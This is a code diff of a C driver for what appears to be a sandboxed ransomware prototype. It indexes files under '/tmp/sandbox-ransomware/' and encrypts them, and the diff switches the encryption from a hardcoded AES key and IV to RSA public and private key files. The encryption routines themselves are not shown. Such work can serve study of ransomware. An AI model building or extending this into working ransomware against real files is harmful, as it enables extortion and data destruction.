@@ -4,16 +4,12 @@
 #include <string.h>
 #include <openssl/evp.h>
 
-#include "crypto_aes.h"
+#include "crypto_rsa.h"
 #include "files_finder.h"
 
 int main(int argc, char const *argv[])
 {
     /* code */
-
-    unsigned char* cle = "77e7b3e71fe30c9a1f653d67943bdd19a82bbada9f0ff804a325ff8515637cb3";
-    unsigned char* iv = "dc1ad035ef18bf8eeb4fde6d232dc51c";
-
     char* paths[] = {"/tmp/sandbox-ransomware/"};
     /* Initialisation de la structure pour la recherche de fichier */
     listFileData* p_listFileData = init_list_file_data();
@@ -24,21 +20,25 @@ int main(int argc, char const *argv[])
     /* Affichage des fichiers indexés */
     //print_path_data(p_listFileData);
 
-    /* Génération structure clé de chiffrement */
-    EVP_CIPHER_CTX* p_e_ctx = load_encryption_key(cle, iv);
+    /* Chargement public key */
+    EVP_PKEY* p_pubKey = rsa_load_key("public.pem", OSSL_KEYMGMT_SELECT_PUBLIC_KEY);
 
-    /* Chiffrement aes */
-    aes_encrypt_files(p_listFileData, p_e_ctx);
+    //printf("size of p_pubKey: %d\n", EVP_PKEY_size(p_pubKey));
 
-    /* Génération structure clé de déchiffrement */
-    EVP_CIPHER_CTX* p_d_ctx = load_decryption_key(cle, iv);
+    /* Chiffrement des fichiers */
+    rsa_encrypt_files(p_listFileData, p_pubKey);
 
-    /* Déchiffrement aes */
-    aes_decrypt_files(p_listFileData, p_d_ctx);
+    EVP_PKEY_free(p_pubKey);
+
+    /* Chargment private key */
+    EVP_PKEY* p_privKey = rsa_load_key("private.pem", OSSL_KEYMGMT_SELECT_PRIVATE_KEY);
+
+    /* Déchiffrement des fichiers */
+    rsa_decrypt_files(p_listFileData, p_privKey);
 
     free_path_data(p_listFileData);
-    EVP_CIPHER_CTX_free(p_e_ctx);
-    EVP_CIPHER_CTX_free(p_d_ctx);
 
-    return 0;
+    EVP_PKEY_free(p_privKey);
+
+    return EXIT_SUCCESS;
 }
